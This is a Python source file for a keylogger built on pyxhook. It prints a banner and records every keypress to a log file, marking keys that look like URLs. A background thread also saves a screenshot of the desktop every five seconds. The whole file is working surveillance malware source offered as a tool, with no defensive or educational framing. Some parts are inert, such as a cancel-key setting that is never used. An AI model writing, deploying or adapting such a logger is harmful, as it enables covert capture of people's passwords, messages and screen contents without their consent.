import os
import pyxhook
import re
import time
import threading
import pyscreenshot as ImageGrab

log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
cancel_key = ord(os.environ.get('pylogger_cancel', '`')[0])

if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        pass

url_pattern = re.compile(r'(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:\'".,<>?«»“”‘’]))')

# Map special key names to their respective characters
special_keys = {
    'period': '.',
    'slash': '/',
    'backslash': '\\',
    'space': ' ',
    'exclam': '!',
    'at': '@',
    'numbersign': '#',
    'dollar': '$',
    'percent': '%',
    'asciicircum': '^',
    'ampersand': '&',
    'asterisk': '*',
    'parenleft': '(',
    'parenright': ')',
    'minus': '-',
    'underscore': '_',
    'equal': '=',
    'plus': '+',
    'bracketleft': '[',
    'bracketright': ']',
    'braceleft': '{',
    'braceright': '}',
    'semicolon': ';',
    'apostrophe': '\'',
    'quotedbl': '"',
    'comma': ',',
    'less': '<',
    'greater': '>',
    'question': '?',
    'colon': ':',
    'bar': '|',
}

def OnKeyPress(event):
    key = event.Key

    with open(log_file, 'a') as f:
        if key == 'Escape':  # End the keylogger on Escape key press
            new_hook.cancel()
        elif key in special_keys:
            f.write('{}\n'.format(special_keys[key]))
        elif url_pattern.search(key):
            f.write('[URL] {}\n'.format(key))
        else:
            f.write('{}\n'.format(key))

def take_screenshot():
    while True:
        # Take screenshot using pyscreenshot
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        file_name = os.path.join(os.path.expanduser('~/Desktop'), f'screenshot_{timestamp}.png')
        screenshot.save(file_name)

        # Sleep for 5 seconds
        time.sleep(5)

def print_banner():
    banner = """
 ____  _            _       ____        _   
|  _ \| |          (_)     |  _ \      | |  
| |_) | |_   _  ___ _  ___ | |_) | ___ | |_ 
|  _ <| | | | |/ __| |/ _ \|  _ < / _ \| __|
| |_) | | |_| | (__| | (_) | |_) | (_) | |_ 
|____/|_|\__,_|\___|_|\___/|____/ \___/ \__|
                                         
"""
    print(banner)
    print("Keylogging Started")
    print("Recording...")

print_banner()

# Create a thread for taking screenshots
screenshot_thread = threading.Thread(target=take_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()

try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg = 'Error while catching events:\n {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
